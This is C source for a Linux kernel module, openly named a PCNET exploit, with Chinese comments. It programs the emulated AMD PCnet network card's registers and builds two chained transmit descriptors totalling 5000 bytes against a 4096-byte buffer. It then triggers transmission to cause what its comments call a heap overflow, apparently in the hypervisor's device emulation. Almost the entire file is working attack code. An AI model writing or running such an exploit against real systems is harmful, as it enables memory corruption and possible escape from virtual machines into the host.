#include <linux/io.h>
#include <linux/ioport.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/delay.h> 
#include <asm/io.h>

MODULE_LICENSE("GPL");

// [確認] 根據你的 lspci 截圖，你的 PCNET I/O Port 是 c040
#define PCNET_IO_BASE 0xc040

// PCNET 初始化結構體 (32-bit mode)
struct pcnet_initblk32 {
    uint16_t mode;
    uint8_t rlen;
    uint8_t tlen;
    uint16_t padr[3];
    uint16_t _res;
    uint16_t ladrf[4];
    uint32_t rdra;
    uint32_t tdra;
};

// 傳輸描述符結構 (TMD)
struct pcnet_TMD {
    uint32_t tbadr; // Buffer Address
    int16_t length; // Buffer Length (2's complement)
    int16_t status; // Status (OWN, STP, ENP...)
    uint32_t misc;
    uint32_t res;
};

// 寫入 CSR 暫存器 (控制暫存器)
void pcnet_write_csr(uint32_t index, uint16_t val) {
    outw(index, PCNET_IO_BASE + 0x12); // RAP
    outw(val, PCNET_IO_BASE + 0x10);   // RDP
}

// 寫入 BCR 暫存器 (匯流排控制暫存器)
void pcnet_write_bcr(uint32_t index, uint16_t val) {
    outw(index, PCNET_IO_BASE + 0x12);
    outw(val, PCNET_IO_BASE + 0x16);   // BDP
}

int exploit(void) {
    struct pcnet_initblk32 *initblk;
    struct pcnet_TMD *tmd;
    void *buffer;
    uint32_t phys_addr_init;
    uint32_t phys_addr_tmd;
    uint32_t phys_addr_buf;

    printk(KERN_ALERT " [+] Setting up PCNET Exploit (Port: 0x%x)...\n", PCNET_IO_BASE);

    // 1. 分配記憶體
    initblk = kzalloc(sizeof(struct pcnet_initblk32), GFP_KERNEL);
    tmd = kzalloc(sizeof(struct pcnet_TMD) * 2, GFP_KERNEL); // 兩個 TMD
    buffer = kmalloc(0x1000, GFP_KERNEL); 

    if (!initblk || !tmd || !buffer) {
        printk(KERN_ERR "Memory allocation failed\n");
        return -1;
    }

    // 取得物理地址
    phys_addr_init = (uint32_t)virt_to_phys(initblk);
    phys_addr_tmd = (uint32_t)virt_to_phys(tmd);
    phys_addr_buf = (uint32_t)virt_to_phys(buffer);

    // 2. 設定 initblk
    // 設定 tlen/rlen 為 4 (代表 Ring Size = 16)
    initblk->tlen = 4 << 4; 
    initblk->rlen = 4 << 4;
    initblk->tdra = phys_addr_tmd; // 指向 TMD 陣列
    initblk->rdra = phys_addr_tmd; 

    // 3. 構造惡意 TMD 鏈 (Heap Overflow 核心)
    
    // TMD[0]: 第一個分片 (3000 bytes)
    tmd[0].tbadr = phys_addr_buf;
    tmd[0].length = (int16_t)(0xf000 | (0x10000 - 3000)); 
    // Status: STP(Start)=1, ENP(End)=0, OWN=1 (交給網卡)
    tmd[0].status = 0x8200; 

    // TMD[1]: 第二個分片 (2000 bytes) -> 總長 5000 > 4096 (Buffer Overflow!)
    tmd[1].tbadr = phys_addr_buf;
    tmd[1].length = (int16_t)(0xf000 | (0x10000 - 2000));
    // Status: STP=0, ENP(End)=1, OWN=1
    tmd[1].status = 0x8100;

    // 4. 與網卡交互流程
    
    // (1) 重置網卡 (STOP)
    pcnet_write_csr(0, 0x0004); 

    // (2) 啟用 32-bit 模式
    pcnet_write_bcr(20, 0x0002);

    // (3) 告訴網卡 initblk 的位置 (IADR)
    pcnet_write_csr(1, phys_addr_init & 0xffff); 
    pcnet_write_csr(2, phys_addr_init >> 16);    

    // (4) 初始化網卡 (INIT)
    printk(KERN_ALERT " [+] Initializing PCNET...\n");
    pcnet_write_csr(0, 0x0001); 

    // [重要] 等待初始化完成
    printk(KERN_ALERT " [+] Waiting for initialization...\n");
    mdelay(200); 

    // (5) [新增] 啟動網卡 (START)
    // 必須先 START 開啟 TXON，才能發送封包
    printk(KERN_ALERT " [+] Starting PCNET (Enable TX)...\n");
    pcnet_write_csr(0, 0x0002);

    // (6) 發送封包 (Transmit Demand) **important
    printk(KERN_ALERT " [+] Triggering Overflow (TX)...\n");
    pcnet_write_csr(0, 0x0008); 

    return 0;
}

int moduleInit(void) {
    printk(KERN_ALERT " [+] PCNET Exploit Loaded\n");
    exploit();
    return 0;
}

int moduleExit(void) {
    printk(KERN_ALERT " [+] PCNET Exploit Unloaded\n");
    return 0;
}

module_init(moduleInit);
module_exit(moduleExit);